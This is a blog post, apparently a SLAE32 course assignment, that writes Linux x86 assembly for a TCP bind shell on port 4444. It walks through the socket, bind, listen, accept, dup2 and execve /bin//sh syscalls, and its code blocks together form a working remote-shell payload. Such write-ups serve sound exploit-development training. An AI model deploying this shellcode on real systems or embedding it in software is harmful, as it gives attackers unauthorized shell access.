---
layout: single
title: SLAE32 - Assignment 0x01
date: 2019-9-19
classes: wide
header:
  teaser: /assets/images/OSCP/pwk.png
tags:
  - Assembly
  - Pentester Academy
  - SLAE32
  - Bind Shell TCP
  - Assignment
--- 
![](/assets/images/SLAE32/shellcoding32.png)

## Introduction
This is the first assignment from Viviek Ramchandran's SLAE32 course.<br>
The first part of the assignment request to create a Shell_Bind_TCP shellcode with these properties:
- Binds to a port 
- Execs Shell on incoming connecton

The second part request to create a script to make port number easily configurable.<br>
According with [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/), bind shell could be compared to the old backdoors placed by programmers to always have a preferential access to systems.
> *Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machineâ€™s listener which then leads to code or command execution on the server.* <br>

The last video lesson of SLAE course analyzes a tcp bind shell payload created with msfvenom so the creation process is well documented like the shell structure, so the effort for this assignment is to pickup informations about all the syscalls needed for the tcp bind shell using the linux kernel unistd.h header and the ```man 2``` command.
We will use also the book 
[Unix Network Programming](https://www.amazon.com/UNIX-Network-Programming-Richard-Stevens/dp/0139498761)
, foundamental to learn the substructures required in some syscalls.
We start reviewing the case study in the course and reading the png created with sctest of libemu tool suite, with that informations we can extract the syscalls needed to build our bind shellcode:

- socket
- bind
- listen
- accept
- dup2 (3 times)
- execve

we could simply copy the assembly code, but this is not the scope of the Viviek's assignment. What he would to obtain with the assignment is to understand how we should develop a shellcode, starting from learn the linux syscalls, what we need to complete assignment and how we can transform the syscall and its argument in assembly code.
So let's start the fun part.

## SOCKET
We can start searching the socket syscall by cat'ting the unistd_32 headers of the linux kernel, then check the socket syscall man page.<br>
![](/assets/images/SLAE32/assignment_1/socket_1.png)<br>
```C
man 2 socket
```
```C
int socket(int domain, int type, int protocol);
```
Mmm, seems the socket accept 3 arguments, now we can check also the book to learn what's the role of there arguments.<br>
```int domain``` specifies a communication domain, this means that it specifies the Address Family (AF_xxxx) wich will be used for communication.<br>
```int type``` specifies the communication semantics.<br>
Not all combinations of socket domain and type are valid, we want a TCP bind shell, so according to the book, our choices has to be ```AF_INET``` for the domain and ```SOCKET_STREAM``` for the type.<br>
![](/assets/images/SLAE32/assignment_1/socket_0.png)<br>
According to what we have studied in the course, the informations found with the ```man 2``` command has to be distribuited with the criteria here explained.
Syscall number has to go in the EAX register, ```int domain``` should be ```AF_INET``` that means a value of 2 saved in the EBX register, ```int type``` should be ```SOCK_STREAM```, that means a value of 1 saved in the ECX register, last ```int protocol``` should be 0 and placed in EDX register.<br>
![](/assets/images/SLAE32/assignment_1/socket_2.png)
![](/assets/images/SLAE32/assignment_1/socket_3.png)<br>
Now that we have indentified the socket syscall arguments, what have to be they values and in what register they has to be pushed we can proceed writing the assembly code.

```bash
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov cl, 0x1
mov bl, 0x2
mov ax, 0x167
int 0x80
```
The socket syscall return an output that is the pointer to the socket itself and will be stored in EAX register, so in order to recover the pointer to the socket for future uses we have to move it in a safer place like the EDI register.

```bash
mov edi, eax
```
Well, we can move to the next syscall.

## BIND
As for ```bind``` we need to find the value of the syscall and consult the man page.
![](/assets/images/SLAE32/assignment_1/bind_0.png)<br>
syscall code for ```bind``` is 361, in hexadecimal is 0x169. Let see the ```man 2 bind``` page
```C
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
Very interesting, here we have a data structure called ```sockaddr```, we can read the book to see if it can help us understand how this data structure has to be build.
>*Many of the BSD networking system calls require a pointer to a socket address structure as an argument. The definition of this structure is in sys/socket.h*<br>

Checking the ```man 2 bind``` page, we see that ```sockaddr``` structure is defined like this
```C
struct sockaddr {
               sa_family_t sa_family;
               char        sa_data[14];
           }
```
The contents of the 14 bytes of protocol-specific address are interpreted according to the type of address. We already choosed the type in the ```socket``` syscall.
```AF_INET``` was our choice so an Address Family INtErneT defined by ```sockaddr_in``` structure. Checking ```man 7 ip``` and the book to learn how the ```sockaddr_in``` structure has to be build

```C
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };

           /* Internet address. */
           struct in_addr {
               uint32_t       sin_addr;   /* address in network byte order */
           	   char			  sin_zero;	  /* unused */	
           };

```
So for our purpouses we have to build a structure like the above and to do that we can use the stack. 
Now we have to check what we need for ```bind``` syscall and where we have to put things
![](/assets/images/SLAE32/assignment_1/bind_1.png)<br>
First thing is the syscall hex value (0x169) that has to be saved in EAX, next is the pointer to the socket that is stored in EDI and has to be moved in EBX, then we will push all the values needed for the sockaddr structure in the stack and then save the ESP value in ECX, finally we have to store the length of the IP (16 bytes) in EDX register.<br>
Before proceeding with the assembly we have to take note of 2 things: 
1. Because we are in a little endian environment we have to push the values of sockaddr structure in reverse order, so <br>
```| 0 (unused char) | IP address (0.0.0.0 so 0) | port in network byte order | 0x02 (AF_INET value) |```
2. For the same reason the port value as to be stored with bytes reversed, if the port is 4444 and in hex is 0x115c, it has to be stored like 0x5c11.<br>
Let's write the assembly

```bash
; xoring the registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; move the lenght (16 bytes) of IP in EDX 
mov dl, 0x16

; push sockaddr structure in the stack
push ecx 			; unused char
push ecx 			; ip address 0.0.0.0
push word 0x5c11	; port 4444
push word 0x02		; AF_INET family

; move the stack pointer to ECX
mov ecx, esp

; move the socket pointer to EBX
mov ebx, edi

; load the bind syscall value in EAX
mov ax, 0x169

; execute
int 0x80
```
Well done, move to the next syscall

## LISTEN
As usual we need to find the value of the syscall and consult the man page.
![](/assets/images/SLAE32/assignment_1/listen_0.png)<br>
The syscall code for listen is 363, in hexadecimal 0x16b, now check the man page
![](/assets/images/SLAE32/assignment_1/listen_1.png)<br>
This syscall is less interesting. In order to have all the things working we have to store the syscall hexadecimal value (0x16b) to EAX, next we should move the socket pointer stored in EDI to EBX and last set ECX to 0 as want an immediate connection.<br>
Let's write the assembly
```bash
xor eax, eax
xor ebx, ebx
xor ecx, ecx
mov ebx, edi
mov ax, 0x16b
int 0x80
``` 

## ACCEPT(4)
Next syscall same story, we need to find the value of the syscall and consult the man page.
![](/assets/images/SLAE32/assignment_1/accept_0.png)<br>
![](/assets/images/SLAE32/assignment_1/accept_1.png)<br>

From the book
> the ```peer``` and ```addrlen``` arguments are used to return the address of the connected peer process (the client).<br>

We don't need it so  ```peer``` and ```addrlen``` could be set to 0.
In synthesis another very simple syscall. EAX contains the syscall hexadecimal value 0x16c, EBX contains the pointer value of the socket stored in EDI, last ECX and EDX could be 0. 

From the ```man 2 accept``` page
```C
RETURN VALUE
       On success, these system calls return a nonnegative integer 
       that is a descriptor for the accepted socket.  
       On error, -1 is returned, and errno is set appropriately.
```
We have to pay attention only on the concept that the ```accept``` syscall return a value when a connection is accepted, this value is stored in EAX register and is needed for the next syscall, so we have to store the value to another register, for example ESI.<br>
Here's the assembly code
```bash
xor eax, eax
xor ebx, ebx
xor ecx, ecx
mov ax, 0x16c
mov ebx, edi
int 0x80

; move the return value of accept from EAX to ESI
mov esi, eax
```
## DUP
We need to find the value of the syscall and consult the man page.
![](/assets/images/SLAE32/assignment_1/dup_0.png)<br>
![](/assets/images/SLAE32/assignment_1/dup_1.png)<br>
The  dup() system call creates a copy of the file descriptor oldfd, using the lowest-numbered unused descriptor for the new descriptor.
Another simple syscall, in EAX we store the hexadecimal value of 63, 0x3f, in EBX we store the address of the accepted connection by ```accept``` syscalll and saved in ESI register, last in ECX we have to save the value of all possibly file descriptor, in UNIX system they are stdin, stdout and stderr, respectively with value 0, 1 and 2.
In this case we have to execute the dup2 syscall 3 times, for stdin, stdout and stderr, using a loop.
Here's the assembly code

```bash
xor ebx, ebx
xor ecx, ecx
mov cl, 0x3

dup2:
	xor eax, eax
	mov ebx, esi
	mov al, 0x3f
	dec cl
	int 0x80
	jnz dup2
```

## EXECVE

```bash
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
	
; push NULL in the EDX position
push eax
mov edx, esp

; push the /bin//sh address in the stack and then move it in ECX
push ebx
mov ecx, esp

; call the execve syscall
mov al, 11
int 0x80

```